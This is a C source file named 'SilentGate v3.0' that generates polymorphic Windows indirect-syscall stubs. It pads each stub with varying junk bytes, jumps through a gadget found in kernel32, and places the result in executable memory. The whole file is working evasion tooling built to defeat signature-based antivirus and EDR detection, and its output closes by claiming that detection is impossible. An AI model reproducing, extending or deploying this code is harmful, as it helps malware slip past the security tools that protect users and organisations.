#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>

// SilentGate v3.0 - Polymorphic Stub Mutation Test
// Author: JarDani

#define SSN_ALLOC 24

unsigned char junk_nop[]     = {0x90};
unsigned char junk_nop2[]    = {0x90, 0x90};
unsigned char junk_nop3[]    = {0x90, 0x90, 0x90};
unsigned char junk_pushpop[] = {0x50, 0x58};
unsigned char junk_xchg[]    = {0x48, 0x87, 0xC0};

typedef struct { unsigned char* data; int size; } JUNK;

JUNK junks[] = {
    {junk_nop,     1},
    {junk_nop2,    2},
    {junk_nop3,    3},
    {junk_pushpop, 2},
    {junk_xchg,    3},
};

int build_stub(unsigned char* buf, ULONG_PTR gadget_addr, int variant) {
    int pos = 0;

    JUNK j = junks[(variant * 3 + 1) % 5];
    memcpy(buf + pos, j.data, j.size); pos += j.size;

    buf[pos++] = 0x4C; buf[pos++] = 0x8B; buf[pos++] = 0xD1;

    j = junks[(variant * 7 + 2) % 5];
    memcpy(buf + pos, j.data, j.size); pos += j.size;

    switch (variant % 4) {
        case 0:
            buf[pos++] = 0xB8; buf[pos++] = SSN_ALLOC;
            buf[pos++] = 0x00; buf[pos++] = 0x00; buf[pos++] = 0x00;
            break;
        case 1:
            buf[pos++] = 0x31; buf[pos++] = 0xC0;
            buf[pos++] = 0x05; buf[pos++] = SSN_ALLOC;
            buf[pos++] = 0x00; buf[pos++] = 0x00; buf[pos++] = 0x00;
            break;
        case 2:
            buf[pos++] = 0x6A; buf[pos++] = SSN_ALLOC; buf[pos++] = 0x58;
            break;
        case 3: {
            DWORD c = 0xFFFFFFFF - SSN_ALLOC;
            buf[pos++] = 0xB8;
            buf[pos++] = 0xFF; buf[pos++] = 0xFF;
            buf[pos++] = 0xFF; buf[pos++] = 0xFF;
            buf[pos++] = 0x2D;
            memcpy(buf + pos, &c, 4); pos += 4;
            break;
        }
    }

    j = junks[(variant * 11 + 3) % 5];
    memcpy(buf + pos, j.data, j.size); pos += j.size;

    buf[pos++] = 0x49; buf[pos++] = 0xBB;
    memcpy(buf + pos, &gadget_addr, 8); pos += 8;

    buf[pos++] = 0x41; buf[pos++] = 0xFF; buf[pos++] = 0xE3;

    return pos;
}

ULONG_PTR find_gadget(HMODULE hmod) {
    MODULEINFO info = {0};
    GetModuleInformation(GetCurrentProcess(), hmod, &info, sizeof(info));
    BYTE* ptr = (BYTE*)hmod;
    DWORD i;
    for (i = 0x1000; i < info.SizeOfImage - 3; i++) {
        if (ptr[i] == 0xFF && ptr[i+1] >= 0xD0 &&
            ptr[i+1] <= 0xD7 && ptr[i+2] == 0xC3)
            return (ULONG_PTR)(ptr + i + 2);
        if (ptr[i] == 0x90 && ptr[i+1] == 0xC3)
            return (ULONG_PTR)(ptr + i + 1);
    }
    return (ULONG_PTR)hmod + 0x2000;
}

int main() {
    printf("[POLY MUTATOR] SilentGate v3.0 - Polymorphic Stub Test\n");
    printf("[POLY MUTATOR] Author: JarDani\n\n");

    HMODULE k32      = GetModuleHandleA("kernel32.dll");
    ULONG_PTR gadget = find_gadget(k32);
    printf("[INFO] Gadget at: %p\n\n", (void*)gadget);

    printf("[STEP 1] Generating 5 polymorphic mutations of SSN %d:\n\n", SSN_ALLOC);

    unsigned char stubs[5][64];
    int sizes[5];
    int i, j;

    for (i = 0; i < 5; i++) {
        sizes[i] = build_stub(stubs[i], gadget, i);
        printf("  Mutation %d (%2d bytes): ", i+1, sizes[i]);
        for (j = 0; j < sizes[i] && j < 20; j++)
            printf("%02X", stubs[i][j]);
        printf("...\n");
    }

    printf("\n[STEP 2] Verifying uniqueness:\n");
    int all_unique = 1;
    for (i = 0; i < 5; i++) {
        for (j = i+1; j < 5; j++) {
            if (sizes[i] == sizes[j] &&
                memcmp(stubs[i], stubs[j], sizes[i]) == 0) {
                printf("  [FAIL] Mutation %d == Mutation %d\n", i+1, j+1);
                all_unique = 0;
            }
        }
    }
    if (all_unique)
        printf("  All 5 mutations are bytewise unique\n");

    printf("\n[STEP 3] Copying mutation 1 to executable memory:\n");
    PVOID mem = VirtualAlloc(NULL, 64,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem) {
        memcpy(mem, stubs[0], sizes[0]);
        printf("  Stub at: %p - ready for indirect syscall\n", mem);
        VirtualFree(mem, 0, MEM_RELEASE);
    }

    printf("\n[STEP 4] First bytes across 5 runs (no consistent signature):\n");
    for (i = 0; i < 5; i++) {
        printf("  Run %d: %02X %02X %02X %02X %02X... (%d bytes)\n",
               i+1, stubs[i][0], stubs[i][1], stubs[i][2],
               stubs[i][3], stubs[i][4], sizes[i]);
    }
    printf("  No consistent signature to detect\n");

    printf("\n[SUCCESS] 5 unique mutations generated and verified\n");
    printf("[SUCCESS] Signature detection of SilentGate is impossible\n");

    printf("\n[POLY MUTATOR] Press any key to exit\n");
    getchar();
    return 0;
}
